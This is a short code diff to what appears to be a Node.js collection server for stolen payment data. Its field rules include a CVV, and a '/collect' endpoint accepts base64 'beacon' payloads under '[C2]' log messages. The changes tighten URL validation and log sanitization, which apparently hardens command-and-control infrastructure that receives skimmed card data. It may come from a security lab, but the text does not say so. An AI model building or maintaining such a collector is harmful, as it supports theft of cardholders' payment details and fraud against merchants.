@@ -40,7 +40,7 @@ const VALIDATION_RULES = {
   cvv: { regex: /^[0-9]{3,4}$/, maxLength: 4 },
   source: { regex: /^[a-zA-Z0-9-]{1,50}$/, maxLength: 50 },
   timestamp: { regex: /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/, maxLength: 30 },
-  url: { regex: /^https?:\/\/[^\s/$.?#]\.[^\s]*$/, maxLength: 256 }
+  url: { regex: /^https?:\/\/(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|[a-zA-Z0-9.-]+)(?::\d{1,5})?(?:\/[^\s]*)?$/, maxLength: 256 }
 }
 
 const ALLOWED_FIELDS = Object.keys(VALIDATION_RULES)
@@ -70,10 +70,11 @@ function sanitizeField(value, fieldName) {
   return str || undefined
 }
 
-// Sanitize for logging: Prevent log injection (newline forging)
+// Sanitize for logging: Prevent log injection (newline forging and contorl chars)
 function sanitizeForLog(val) {
   if (val === undefined || val === null) return 'N/A';
-  return String(val).replace(/[\r\n]/g, ' ').trim() || 'N/A';
+  // Remove all ASCII control characters (includes \r and \n) and trim
+  return String(val).replace(/[\x00-\x1F\x7F]/g, ' ').trim() || 'N/A';
 }
 
 // Sanitize request body: only keep allowed fields, sanitize values
@@ -166,7 +167,8 @@ app.get('/collect', collectLimiter, async (req, res) => {
   if (req.query.d) {
     // Basic size validation for base64 payload (10KB limit)
     if (req.query.d.length > 10240) {
-      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${req.query.d.length} bytes)`)
+      const payloadLength = Math.max(0, Number(req.query.d.length) || 0)
+      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${payloadLength} bytes)`)
     } else {
       try {
         await ensureDataDir()
